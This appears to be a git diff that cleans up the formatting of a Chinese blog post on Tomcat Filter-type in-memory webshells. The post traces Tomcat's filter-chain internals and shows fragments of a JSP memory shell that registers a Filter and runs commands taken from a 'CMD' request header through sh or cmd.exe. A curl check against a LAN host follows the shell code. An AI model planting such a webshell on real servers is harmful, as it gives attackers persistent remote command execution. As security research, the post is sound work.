@@ -8,7 +8,7 @@ updated: 2023-01-01T00:00:00+00:00
 date: 2022-10-11T00:00:00+00:00
 slug: tomcat-filter-memshell
 title: Tomcat Filter型内存马
-cover: https://prod-files-secure.s3.us-west-2.amazonaws.com/67fdb170-fbbe-4acc-adb2-bfe5483404bd/db7c4bcf-0930-45cb-a237-a685eeb33326/9.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=AKIAT73L2G45HZZMZUHI%2F20241006%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20241006T050157Z&X-Amz-Expires=3600&X-Amz-Signature=11cfc693d4d01242e682403b1392c8204439b90c124f455a95c0ce80ccf8cfbf&X-Amz-SignedHeaders=host&x-id=GetObject
+cover: /img/post/tomcat-filter-memshell/9.png
 id: 112906e1-7468-8076-a6e1-c548f280974c
 ---
 
@@ -33,19 +33,19 @@ import java.io.IOException;
 public class FilterDemo implements Filter {
     @Override
     public void init(FilterConfig config) throws ServletException {
-        System.out.printf("Filter Init.\\n");
+        System.out.printf("Filter Init.\n");
     }
 
     @Override
     public void doFilter(ServletRequest request, ServletResponse response, FilterChain chain) throws ServletException, IOException {
-        System.out.printf("Filtering.\\n");
+        System.out.printf("Filtering.\n");
 
         chain.doFilter(request, response);
     }
 
     @Override
     public void destroy() {
-        System.out.printf("Filter Destroy.\\n");
+        System.out.printf("Filter Destroy.\n");
     }
 
 }
@@ -55,9 +55,9 @@ public class FilterDemo implements Filter {
 
 ```xml
 <?xml version="1.0" encoding="UTF-8"?>
-<web-app xmlns="<http://xmlns.jcp.org/xml/ns/javaee>"
-         xmlns:xsi="<http://www.w3.org/2001/XMLSchema-instance>"
-         xsi:schemaLocation="<http://xmlns.jcp.org/xml/ns/javaee> <http://xmlns.jcp.org/xml/ns/javaee/web-app_4_0.xsd>"
+<web-app xmlns="http://xmlns.jcp.org/xml/ns/javaee"
+         xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
+         xsi:schemaLocation="http://xmlns.jcp.org/xml/ns/javaee http://xmlns.jcp.org/xml/ns/javaee/web-app_4_0.xsd"
          version="4.0">
 
     <filter>
@@ -76,15 +76,15 @@ public class FilterDemo implements Filter {
 
 在 IDEA 中配置好 Tomcat，将断点打在 chain.doFilter(request, response)代码行，开始 Debug。
 
-![](https://prod-files-secure.s3.us-west-2.amazonaws.com/67fdb170-fbbe-4acc-adb2-bfe5483404bd/25214d91-5129-486f-ac5d-004e9ef37572/0.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=AKIAT73L2G45HZZMZUHI%2F20241006%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20241006T050158Z&X-Amz-Expires=3600&X-Amz-Signature=d0929a5e8b92d5fac0c5dfec776dff3f3092550b5a59aaddf0fcbba56eaa2272&X-Amz-SignedHeaders=host&x-id=GetObject)
+![](/img/post/tomcat-filter-memshell/0.png)
 
 此时，可观察到 chain 已经是一个 ApplicationFilterChain 对象了。
 
-![](https://prod-files-secure.s3.us-west-2.amazonaws.com/67fdb170-fbbe-4acc-adb2-bfe5483404bd/3fbd7fa9-7cf6-4935-ac53-542143ce1cae/1.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=AKIAT73L2G45HZZMZUHI%2F20241006%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20241006T050158Z&X-Amz-Expires=3600&X-Amz-Signature=2a4f40911346e7174d05038d5b0ce0f60aa241c2a879175342ef5ff944c14f70&X-Amz-SignedHeaders=host&x-id=GetObject)
+![](/img/post/tomcat-filter-memshell/1.png)
 
 往前回溯，到达 org.apache.catalina.core.ApplicationFilterChain#internalDoFilter:241 处。
 
-![](https://prod-files-secure.s3.us-west-2.amazonaws.com/67fdb170-fbbe-4acc-adb2-bfe5483404bd/9dc95cc4-1820-4c0e-8fb3-426e1dae0dac/2.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=AKIAT73L2G45HZZMZUHI%2F20241006%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20241006T050158Z&X-Amz-Expires=3600&X-Amz-Signature=e36327d61ab2051368692ea3d96fb5c65782a1b95e2519655e1313de5b0bd6f3&X-Amz-SignedHeaders=host&x-id=GetObject)
+![](/img/post/tomcat-filter-memshell/2.png)
 
 在该方法中，通过了一个名为 filterConfig 的 ApplicationFilterConfig 对象遍历获取 filters 中的值，而 filters 则是一个 ApplicationFilterConfig 数组。
 
@@ -96,11 +96,11 @@ private ApplicationFilterConfig[] filters = new ApplicationFilterConfig[0];
 
 继续往前跟，到达 org.apache.catalina.core.StandardWrapperValve#invoke 方法中，在其中对 filterChain.doFilter 进行了调用。
 
-![](https://prod-files-secure.s3.us-west-2.amazonaws.com/67fdb170-fbbe-4acc-adb2-bfe5483404bd/5c5bfa6f-745b-4ecc-901b-bbc67cb325f2/3.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=AKIAT73L2G45HZZMZUHI%2F20241006%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20241006T050158Z&X-Amz-Expires=3600&X-Amz-Signature=62bc9f79c8b74fee6d451065a727dc03ec72000a171aa6f237032a6e10946e7a&X-Amz-SignedHeaders=host&x-id=GetObject)
+![](/img/post/tomcat-filter-memshell/3.png)
 
 展开这个 filterChain，可发现其中存放了由我们实现的 FilterDemo 过滤器。
 
-![](https://prod-files-secure.s3.us-west-2.amazonaws.com/67fdb170-fbbe-4acc-adb2-bfe5483404bd/a596a103-9754-44a3-9e29-d19011f8f204/4.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=AKIAT73L2G45HZZMZUHI%2F20241006%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20241006T050158Z&X-Amz-Expires=3600&X-Amz-Signature=9fc116a890291fa7d4c11ae9812e6b42246f432a4e1534782aa7f871ebe0f32d&X-Amz-SignedHeaders=host&x-id=GetObject)
+![](/img/post/tomcat-filter-memshell/4.png)
 
 ```java
 ApplicationFilterChain filterChain = factory.createFilterChain(request, wrapper, servlet);
@@ -112,7 +112,7 @@ ApplicationFilterChain filterChain = factory.createFilterChain(request, wrapper,
 
 过滤器链用于按顺序应用一组过滤器来处理 HTTP 请求和响应，它是通过 org.apache.catalina.core.ApplicationFilterChain 类来实现的，在 org.apache.catalina.core.ApplicationFilterFactory 中提供了 createFilterChain 方法用来创建过滤器链，所以我们将断点打至此处，重新 Debug。
 
-![](https://prod-files-secure.s3.us-west-2.amazonaws.com/67fdb170-fbbe-4acc-adb2-bfe5483404bd/fa94c8af-6deb-4306-ab20-3fac5111ed07/5.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=AKIAT73L2G45HZZMZUHI%2F20241006%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20241006T050158Z&X-Amz-Expires=3600&X-Amz-Signature=0bcaef047049fdd31667be1602674f2eb1ff39196a8d8ef7e0d89038567556fb&X-Amz-SignedHeaders=host&x-id=GetObject)
+![](/img/post/tomcat-filter-memshell/5.png)
 
 这个方法的开头对请求的调度类型（REQUEST、FORWARD、INCLUDE）和路径进行了获取，随后对 servlet 进行了 null 判断，如果为 null，则直接返回 null。
 
@@ -164,7 +164,7 @@ if (request instanceof Request) {
 }
 ```
 
-![](https://prod-files-secure.s3.us-west-2.amazonaws.com/67fdb170-fbbe-4acc-adb2-bfe5483404bd/ff55eda9-44da-4a42-9d67-34b225cd146d/6.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=AKIAT73L2G45HZZMZUHI%2F20241006%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20241006T050158Z&X-Amz-Expires=3600&X-Amz-Signature=bb991b68f20a038ae83ae7084a2c7a78d0b8e377482f2ca01f23daa944b9dab4&X-Amz-SignedHeaders=host&x-id=GetObject)
+![](/img/post/tomcat-filter-memshell/6.png)
 
 再然后，设置过滤器链的 Servlet。
 
@@ -185,7 +185,7 @@ if ((filterMaps == null) || (filterMaps.length == 0))
     return filterChain;
 ```
 
-![](https://prod-files-secure.s3.us-west-2.amazonaws.com/67fdb170-fbbe-4acc-adb2-bfe5483404bd/47550223-e90d-40bf-ba5d-1f4c4517561a/7.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=AKIAT73L2G45HZZMZUHI%2F20241006%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20241006T050158Z&X-Amz-Expires=3600&X-Amz-Signature=50fcf403c5a13f2f8d5dd8e5d426299d7d0dc68edb3de58df2107f5b2f24a985&X-Amz-SignedHeaders=host&x-id=GetObject)
+![](/img/post/tomcat-filter-memshell/7.png)
 
 ```xml
 <filter-mapping>
@@ -233,7 +233,7 @@ for (FilterMap filterMap : filterMaps) {
 }
 ```
 
-![](https://prod-files-secure.s3.us-west-2.amazonaws.com/67fdb170-fbbe-4acc-adb2-bfe5483404bd/9296990d-58f8-4a2b-bbee-d1354f345eda/8.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=AKIAT73L2G45HZZMZUHI%2F20241006%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20241006T050158Z&X-Amz-Expires=3600&X-Amz-Signature=dce72449e490a2140a6100105da604b773596e5f882a20b94e65e1ede3e5a5d5&X-Amz-SignedHeaders=host&x-id=GetObject)
+![](/img/post/tomcat-filter-memshell/8.png)
 
 ```xml
 <filter>
@@ -281,7 +281,7 @@ for (FilterMap filterMap : filterMaps) {
 return filterChain;
 ```
 
-![](https://prod-files-secure.s3.us-west-2.amazonaws.com/67fdb170-fbbe-4acc-adb2-bfe5483404bd/27175418-1f3b-4ce0-ad36-4ee49515efe0/9.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=AKIAT73L2G45HZZMZUHI%2F20241006%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20241006T050158Z&X-Amz-Expires=3600&X-Amz-Signature=a79b75a27566e2d4d4cf49598f6871ea64189212b3e2355491f90d885f2c977e&X-Amz-SignedHeaders=host&x-id=GetObject)
+![](/img/post/tomcat-filter-memshell/9.png)
 
 通过对 createFilterChain 方法的分析，可得知在创建过滤器链前必须要先获取到 StandradContext，根据 StandradContext 获取到 filterConfigs，并对 FilterMap 和 FilterDef 进行添加。
 
@@ -462,7 +462,7 @@ public void addFilterMapBefore(FilterMap filterMap) {
 
 根据如上，我们编写如下 jsp 内存马，将其上传至 Web 应用，并访问执行。
 
-```java
+```jsp
 <%@ page import="java.lang.reflect.Field" %>
 <%@ page import="java.util.Map" %>
 <%@ page import="java.io.IOException" %>
@@ -512,7 +512,7 @@ public void addFilterMapBefore(FilterMap filterMap) {
 
                     String[] cmds = isLinux ? new String[]{"sh", "-c", cmd} : new String[]{"cmd.exe", "/c", cmd};
                     InputStream in = Runtime.getRuntime().exec(cmds).getInputStream();
-                    Scanner s = (new Scanner(in)).useDelimiter("\\\\a");
+                    Scanner s = (new Scanner(in)).useDelimiter("\\a");
                     String output = s.hasNext() ? s.next() : "";
                     PrintWriter out = response.getWriter();
                     out.println(output);
@@ -580,8 +580,8 @@ public void addFilterMapBefore(FilterMap filterMap) {
 
 最后验证如下，成功注入 Filter 型内存马并成功执行命令。
 
-```shell
-# curl <http://192.168.1.102:7788/filterMemShell.jsp> && curl <http://192.168.1.102:7788/> -H "CMD: pwd"
+```bash
+# curl http://192.168.1.102:7788/filterMemShell.jsp && curl http://192.168.1.102:7788/ -H "CMD: pwd"
 Filter Mem Shell Successful Injection :)
 
 /opt/apache-tomcat/apache-tomcat-7.0.109/bin
